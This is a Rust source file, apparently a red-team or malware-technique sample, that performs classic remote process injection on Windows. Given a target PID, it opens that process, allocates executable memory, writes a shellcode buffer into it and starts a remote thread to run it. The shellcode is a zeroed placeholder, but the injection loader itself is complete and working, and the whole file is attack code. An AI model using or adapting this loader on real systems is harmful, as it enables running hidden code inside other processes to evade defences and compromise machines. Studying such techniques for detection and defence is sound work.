use std::{env::args, ffi::c_void, mem::transmute};
use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                CreateRemoteThread, INFINITE, OpenProcess, PROCESS_ALL_ACCESS,
                THREAD_CREATION_FLAGS, WaitForSingleObject,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.is_invalid() {
                let _ = CloseHandle(self.0);
            }
        }
    }
}

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let pid: u32 = match args().nth(1) {
        Some(arg) => arg
            .parse()
            .map_err(|_| Error::new(HRESULT(0), "Invalid PID argument"))?,
        None => {
            eprintln!("Usage: ./injectum_classic_remote.exe <PID>");
            return Ok(());
        }
    };

    let h_process = HandleGuard(unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? });

    let h_memory = unsafe {
        VirtualAllocEx(
            h_process.0,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if h_memory.is_null() {
        return Ok(());
    }

    let mut bytes_written = 0usize;

    unsafe {
        WriteProcessMemory(
            h_process.0,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?
    }

    let mut thread_id = 0u32;

    let h_thread = HandleGuard(unsafe {
        CreateRemoteThread(
            h_process.0,
            None,
            0,
            Some(transmute::<
                *mut c_void,
                unsafe extern "system" fn(*mut c_void) -> u32,
            >(h_memory)),
            None,
            THREAD_CREATION_FLAGS(0).0,
            Some(&mut thread_id),
        )?
    });

    unsafe {
        WaitForSingleObject(h_thread.0, INFINITE);
    }

    Ok(())
}
